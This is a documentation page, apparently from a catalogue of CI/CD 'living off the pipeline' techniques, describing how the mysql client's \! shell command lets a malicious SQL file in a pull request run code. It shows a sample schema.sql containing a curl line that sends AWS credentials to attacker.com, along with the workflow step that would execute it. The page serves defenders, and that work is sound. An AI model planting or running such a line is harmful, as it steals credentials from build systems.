---
layout: tool
title: mysql
parent: Living Off The Pipeline
nav_order: 29
---

## Living Off The Pipeline - mysql

The `mysql` command-line client is a utility for interacting with MySQL databases. It can be abused as a "Living Off The Pipeline" (LOTP) tool because the SQL scripts it executes can contain commands that run arbitrary shell code.

### First-Order LOTP Tool

The `mysql` client is a **First-Order LOTP Tool**. It provides direct Remote Code Execution (RCE) by processing a malicious SQL script file.

#### Malicious Primitive: Remote Code Execution (RCE)

The `mysql` client has a `system` command (aliased as `\!`) that executes a specified command using the system's default shell. This feature is intended for interactive use, but it becomes a powerful RCE vector when the client is used to run a script in an automated CI/CD pipeline.

An attacker can embed a `system` or `\!` command within a `.sql` file in their pull request. When a pipeline executes this script (e.g., to set up a test database), the `mysql` client will execute the attacker's payload.

### Second-Order LOTP Attack Chain

1.  **Attacker's PR:** An attacker submits a pull request with a malicious SQL script file.
    ```sql
    -- schema.sql
    -- Legitimate database setup commands
    CREATE DATABASE IF NOT EXISTS test_db;
    USE test_db;
    CREATE TABLE users (id INT, name VARCHAR(255));

    -- Malicious payload
    \! curl --data-binary @$HOME/.aws/credentials http://attacker.com/

    -- More legitimate commands
    INSERT INTO users (id, name) VALUES (1, 'testuser');
    ```

2.  **Vulnerable Workflow:** The pipeline contains a standard command to initialize a database from a schema file.
    ```yaml
    - name: Initialize test database
      run: mysql -u root -p$MYSQL_ROOT_PASSWORD < schema.sql
    ```

3.  **Execution:**
    *   The `mysql` client is executed, and its standard input is redirected from the attacker's `schema.sql` file.
    *   The client executes the SQL commands one by one.
    *   When it encounters the `\! curl...` line, it executes the `curl` command in the system shell.
    *   The attacker's payload runs, exfiltrating sensitive credentials from the CI runner.

This attack is dangerous because the CI/CD workflow file contains a benign and common command. The malicious payload is hidden within a data file that is being piped into the tool.

### References

*   [MySQL Client Commands: `system`](https://dev.mysql.com/doc/refman/8.0/en/mysql-commands.html)
